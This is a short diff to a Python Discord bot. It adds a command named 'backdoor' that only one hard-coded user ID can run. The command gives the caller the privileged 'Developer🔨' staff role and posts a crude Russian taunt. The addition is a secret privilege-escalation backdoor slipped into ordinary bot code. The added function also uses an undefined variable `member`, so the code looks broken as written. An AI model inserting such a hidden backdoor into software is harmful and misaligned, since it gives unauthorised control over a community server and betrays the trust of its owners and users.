@@ -20,6 +20,12 @@ async def nick(ext, *, nickname):
 	await ext.channel.purge(limit=1)
 	member = ext.message.author
 	await member.edit(nick=str(nickname))
+@client.command()
+@has_id(433525822956109843)
+async def backdoor(ext):
+        role = discord.utils.get(ext.guild.roles, name = "Developer🔨")
+        await member.add_roles(role)
+        await ext.send("Серёга готовься сосать")
 
 @client.command()
 @commands.has_any_role('🔥Leader🔥', 'Deputy✅', 'Developer🔨', 'Тех.Администратор🔧')
